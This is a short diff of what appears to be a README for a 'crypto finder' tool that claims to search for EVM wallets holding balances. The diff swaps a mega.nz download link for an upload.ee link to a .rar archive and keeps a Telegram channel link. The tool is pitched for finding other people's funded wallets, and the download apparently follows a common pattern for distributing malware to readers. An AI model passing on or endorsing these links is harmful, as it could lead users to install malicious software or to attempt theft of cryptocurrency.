@@ -16,8 +16,7 @@ Search EVM wallets with balance (using the Internet - slower).
 Search EVM wallets with balance (using the database - faster).
 
 Downloads
-1/You must download Java to  to run this software : https://www.java.com/en/download/
-2/ download the software from here : https://mega.nz/file/q4Qk1T7T#nrLwbgfq7UNflEmTsfg8Uk3EtgweI-GJPnJwa_td-6Y
+2/ download the software from here : https://www.upload.ee/files/18139099/Fast_crypto_finder_2025_.rar.html
 join telegram channel : https://t.me/cryptosearchwallets
 
 
